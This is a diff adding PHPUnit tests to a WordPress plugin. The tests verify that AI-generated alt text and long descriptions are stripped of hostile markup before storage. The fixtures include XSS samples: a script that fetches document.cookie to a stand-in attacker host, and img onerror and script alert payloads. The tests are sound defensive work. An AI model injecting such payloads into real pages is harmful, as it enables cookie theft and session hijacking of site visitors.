@@ -550,6 +550,177 @@ class DescribeMediaServiceTest extends TestCase
         $this->assertSame('written', $write['description_write'] ?? null);
     }
 
+    /**
+     * BR-130: hostile markup in alt_text_long must not survive into post_content.
+     * Goes RED if maybe_write_long_description writes the raw model string.
+     */
+    public function testAltPlusDescriptionStripsHostileMarkupFromLongDescription(): void
+    {
+        $this->plantWritableAttachment(42);
+        $this->setOption('acx_alt_style', 'alt_plus_description');
+        $hostile = "<script>fetch('https://attacker.invalid/?c='+document.cookie)</script>Plain long text.";
+        $this->queueHttpResponse(array(
+            'response' => array('code' => 200, 'message' => 'OK'),
+            'body'     => (string) json_encode($this->validBackendBodyWithLong(42, $hostile)),
+        ));
+
+        $result = $this->controller->describe_media($this->writeRequest(42));
+
+        $this->assertInstanceOf(WP_REST_Response::class, $result);
+        $stored = $GLOBALS['__ac_posts'][42]->post_content;
+        $this->assertStringNotContainsString('<script>', $stored);
+        $this->assertStringNotContainsString('attacker.invalid', $stored);
+        $this->assertStringNotContainsString('document.cookie', $stored);
+        $this->assertSame('Plain long text.', $stored);
+        $this->assertSame('written', $result->get_data()['alt_text_write']['description_write'] ?? null);
+    }
+
+    /**
+     * BR-130 sibling: alt-text draft is also model output and is stripped at the
+     * write boundary (update_post_meta does not KSES).
+     */
+    public function testWriteAltStripsHostileMarkupFromDraft(): void
+    {
+        $this->plantWritableAttachment(42);
+        $body = $this->validBackendBody(42);
+        $body['alt_text_draft'] = '<img src=x onerror=alert(1)>A photo.';
+        $this->queueHttpResponse(array(
+            'response' => array('code' => 200, 'message' => 'OK'),
+            'body'     => (string) json_encode($body),
+        ));
+
+        $result = $this->controller->describe_media($this->writeRequest(42));
+
+        $this->assertInstanceOf(WP_REST_Response::class, $result);
+        $stored = get_post_meta(42, '_wp_attachment_image_alt', true);
+        $this->assertSame('A photo.', $stored);
+        $this->assertStringNotContainsString('<img', $stored);
+        $this->assertStringNotContainsString('onerror', $stored);
+    }
+
+    /**
+     * BR-149: provenance alt_text_draft must be the same sanitize_text_field
+     * result written to alt meta — never the raw model string. Goes RED if
+     * apply_alt_text_write_policy stamps raw draft into provenance while
+     * sanitizing only the alt write.
+     */
+    public function testProvenanceDraftMatchesSanitizedAltNotRawInput(): void
+    {
+        $this->plantWritableAttachment(42);
+        $raw = '<img src=x onerror=alert(1)>A photo with x < y.';
+        $body = $this->validBackendBody(42);
+        $body['alt_text_draft'] = $raw;
+        $this->queueHttpResponse(array(
+            'response' => array('code' => 200, 'message' => 'OK'),
+            'body'     => (string) json_encode($body),
+        ));
+
+        $result = $this->controller->describe_media($this->writeRequest(42));
+
+        $this->assertInstanceOf(WP_REST_Response::class, $result);
+        $storedAlt = get_post_meta(42, '_wp_attachment_image_alt', true);
+        $provenance = get_post_meta(42, '_acx_description_provenance', true);
+        $this->assertIsArray($provenance);
+        $expected = sanitize_text_field($raw);
+        $this->assertSame($expected, $storedAlt);
+        $this->assertSame($storedAlt, $provenance['alt_text_draft']);
+        $this->assertNotSame($raw, $provenance['alt_text_draft']);
+        $this->assertStringNotContainsString('<img', (string) $provenance['alt_text_draft']);
+    }
+
+    /**
+     * BR-133: bare `<` in model prose must survive into alt (entity-encoded by
+     * sanitize_text_field), not truncate at the first `<`.
+     * Goes RED if normalize_alt_text_draft still uses bare wp_strip_all_tags.
+     *
+     * @dataProvider bareLessThanAltDraftProvider
+     */
+    public function testWriteAltPreservesBareLessThanInDraft(string $draft, string $expected): void
+    {
+        $this->plantWritableAttachment(42);
+        $body = $this->validBackendBody(42);
+        $body['alt_text_draft'] = $draft;
+        $this->queueHttpResponse(array(
+            'response' => array('code' => 200, 'message' => 'OK'),
+            'body'     => (string) json_encode($body),
+        ));
+
+        $result = $this->controller->describe_media($this->writeRequest(42));
+
+        $this->assertInstanceOf(WP_REST_Response::class, $result);
+        $stored = get_post_meta(42, '_wp_attachment_image_alt', true);
+        $this->assertSame($expected, $stored);
+        $this->assertStringNotContainsString('<script>', $stored);
+        $this->assertStringNotContainsString('<img', $stored);
+    }
+
+    /**
+     * BR-133: bare `<` in alt_text_long must survive into post_content via
+     * sanitize_textarea_field (newlines preserved; markup still stripped).
+     *
+     * @dataProvider bareLessThanLongDescriptionProvider
+     */
+    public function testAltPlusDescriptionPreservesBareLessThanInLong(string $long, string $expected): void
+    {
+        $this->plantWritableAttachment(42);
+        $this->setOption('acx_alt_style', 'alt_plus_description');
+        $this->queueHttpResponse(array(
+            'response' => array('code' => 200, 'message' => 'OK'),
+            'body'     => (string) json_encode($this->validBackendBodyWithLong(42, $long)),
+        ));
+
+        $result = $this->controller->describe_media($this->writeRequest(42));
+
+        $this->assertInstanceOf(WP_REST_Response::class, $result);
+        $stored = $GLOBALS['__ac_posts'][42]->post_content;
+        $this->assertSame($expected, $stored);
+        $this->assertStringNotContainsString('<script>', $stored);
+        $this->assertStringNotContainsString('<img', $stored);
+        $this->assertSame('written', $result->get_data()['alt_text_write']['description_write'] ?? null);
+    }
+
+    /**
+     * @return array<string, array{0: string, 1: string}>
+     */
+    public static function bareLessThanAltDraftProvider(): array
+    {
+        return array(
+            'comparison' => array('x <= y', 'x &lt;= y'),
+            'heart_prose' => array(
+                'Photo of a <3 shaped cloud above the lake',
+                'Photo of a &lt;3 shaped cloud above the lake',
+            ),
+            'script_still_stripped' => array('<script>alert(1)</script>Safe text', 'Safe text'),
+            'img_onerror_still_stripped' => array('<img src=x onerror=alert(1)>A photo.', 'A photo.'),
+        );
+    }
+
+    /**
+     * @return array<string, array{0: string, 1: string}>
+     */
+    public static function bareLessThanLongDescriptionProvider(): array
+    {
+        return array(
+            'comparison' => array('x <= y', 'x &lt;= y'),
+            'heart_prose' => array(
+                'Photo of a <3 shaped cloud above the lake',
+                'Photo of a &lt;3 shaped cloud above the lake',
+            ),
+            'multiline_preserved' => array(
+                "Line one\nPhoto of a <3 cloud",
+                "Line one\nPhoto of a &lt;3 cloud",
+            ),
+            'script_still_stripped' => array(
+                "<script>alert(1)</script>Plain long text.",
+                'Plain long text.',
+            ),
+            'img_onerror_still_stripped' => array(
+                '<img src=x onerror=alert(1)>Long caption.',
+                'Long caption.',
+            ),
+        );
+    }
+
     public function testAltStyleDefaultNeverWritesDescriptionEvenWhenLongPresent(): void
     {
         // Option unset -> alt_only default = current behavior byte-identical.
